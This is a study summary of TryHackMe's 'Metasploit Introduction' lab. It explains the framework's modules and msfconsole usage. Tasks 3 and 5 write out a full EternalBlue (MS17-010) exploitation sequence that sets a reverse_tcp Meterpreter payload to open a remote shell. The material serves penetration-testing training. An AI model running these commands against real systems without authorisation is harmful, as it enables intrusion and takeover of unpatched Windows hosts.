# 🛠️ TryHackMe - Metasploit Introduction (Detailed)

This markdown document is a comprehensive summary of the **"Metasploit Introduction"** room on TryHackMe. It covers the architecture and usage of the Metasploit Framework, its modules, `msfconsole` interaction, and practical exploitation using MS17-010 (EternalBlue).

---

## 📘 Task 1 - Introduction to Metasploit

Metasploit is a powerful, modular exploitation framework widely used in penetration testing and vulnerability research.

### 🔀 Two Versions:
- **Metasploit Pro**: A commercial version with GUI, automation, and management tools.
- **Metasploit Framework**: An open-source, CLI-based version, used in this room.

### 🔧 Capabilities:
- Information gathering
- Scanning and exploitation
- Payload generation
- Post-exploitation
- Exploit development

---

## 🧩 Task 2 - Main Components of Metasploit

### 🔄 Common Terms:
- **Vulnerability**: A flaw in design or logic.
- **Exploit**: Code that leverages a vulnerability.
- **Payload**: The actual code that runs on the target once the vulnerability is exploited.

### 📁 Metasploit Modules

| Type        | Description |
|-------------|-------------|
| **Auxiliary** | Scanners, crawlers, fuzzers, etc. |
| **Encoders**  | Obfuscate payloads to bypass AV |
| **Evasion**   | Modules specifically designed to evade detection |
| **Exploits**  | Attack modules targeting known vulnerabilities |
| **NOPs**      | Filler instructions (e.g. `0x90`) used for alignment |
| **Payloads**  | Shells or commands executed post-exploitation |
| **Post**      | Modules used after a successful exploit |

### 📁 Payload Types:
- **Singles**: Standalone payloads (e.g. `add user`, `launch notepad.exe`)
- **Stagers**: Sets up communication channel
- **Stages**: Sent after stager to complete payload
- **Adapters**: Converts payloads to alternative formats (e.g., PowerShell)

📁 **Default directory**:
```
/opt/metasploit-framework/embedded/framework/modules/
```

---

## 💻 Task 3 - Using Msfconsole

Metasploit's primary user interface is the `msfconsole`, a command-line interface used to interact with modules, payloads, and targets.

---

### 📌 Launching Metasploit
To start the Metasploit console:
```bash
msfconsole
```

You'll see the terminal prompt change to `msf6>` or `msf5>` depending on your version.

---

### 🌐 Supported Commands

- Linux commands (e.g. `ls`, `ping -c 1 8.8.8.8`, `clear`)
- `help`, `history`, `version`, etc.
- Tab-completion
- Context-aware commands depending on loaded modules

---

### 🔁 Prompt Types in Metasploit

| Prompt                            | Description                                 |
|----------------------------------|---------------------------------------------|
| `msf6 >`                         | Base Metasploit CLI                         |
| `msf6 exploit(...) >`           | When you're inside a specific module        |
| `meterpreter >`                  | Meterpreter shell (post-exploitation)       |
| `C:\>`                         | Command shell on the target machine         |

---

### 🧪 Exploiting EternalBlue - Example Walkthrough

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <your-attackbox-ip>
exploit -z
```

Once exploitation succeeds:

```bash
sessions
sessions -i 1
```

This allows interaction with the active Meterpreter session.

---

### 📊 Exploit Ranking in Metasploit

When using the `search` command to find exploits or modules, you'll often see a "Rank" column. This shows the reliability and stability of the module.

Below is the official ranking table used by Metasploit:

![Exploit Ranking Table](https://github.com/user-attachments/assets/633d7d75-f54f-4a74-92ec-5d69e804646d)

| Rank             | Meaning                                                                 |
|------------------|-------------------------------------------------------------------------|
| ExcellentRanking | Very stable, safe to use, no crash expected                             |
| GreatRanking     | Default target + version detection + safe return handling               |
| GoodRanking      | Default target, typical cases (e.g. Win7, Server 2012)                  |
| NormalRanking    | Reliable but version-dependent, may not autodetect                      |
| AverageRanking   | Unstable or less effective in most scenarios                            |
| LowRanking       | Rarely successful, <50% success rate, platform-dependent                |
| ManualRanking    | Mostly DoS or requires custom tuning, not auto-usable                   |

> 📘 Source: [Rapid7 Exploit Ranking Guide](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)


---

## ⚙️ Task 4 - Working with Modules

### 🔍 Common Commands:
- `search <term>`: Locate modules
- `use <module>`: Load a module
- `show options`: View required parameters
- `set <param> <value>`: Assign value
- `setg <param> <value>`: Set global value
- `unset`, `unset all`: Clear parameters


### 📁 Using Target Files with RHOSTS

You can specify multiple targets by using a file and referencing it with the `file:` keyword.

```bash
set RHOSTS file:/root/Desktop/targets.txt
```

This is useful when performing scans or exploits against multiple systems at once.

![Setting RHOSTS with file](https://github.com/user-attachments/assets/3b21bd4b-eb0e-4151-9366-cbfa72fdce48)

*Example of setting RHOSTS with a target file and verifying it with `show options`.*


### 🎛️ Parameters:
| Name    | Description |
|---------|-------------|
| `RHOSTS` | Remote target IP(s) |
| `RPORT`  | Target port (e.g., 80, 445) |
| `LHOST`  | Attacker IP (local) |
| `LPORT`  | Attacker listener port |
| `PAYLOAD` | Payload to be delivered |
| `SESSION` | Used in post-exploitation modules |

### 🧠 Global Variables:
```bash
setg RHOSTS 10.10.10.10
```

Retains value across modules until cleared with:
```bash
unsetg RHOSTS
```

---

## 💥 Task 5 - Exploiting MS17-010 (EternalBlue)

### ▶️ Execution Flow:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
exploit -z
```

### 💬 Session Management:
```bash
sessions           # List all sessions
sessions -i <id>   # Interact with session
background         # Send session to background
```

---

## 🧾 Task 6 - Summary

Metasploit provides:

1. **Modular framework** to streamline exploitation.
2. **Support for a wide range of vulnerabilities and platforms.**
3. **Flexible payload handling** with stagers and stages.
4. **Post-exploitation tools** to gather data, escalate privileges, and maintain access.

You should now be comfortable navigating Metasploit, selecting modules, setting parameters, and exploiting real-world vulnerabilities such as EternalBlue.

---

### 🔗 References:
- [Microsoft MS17-010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)
- [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)
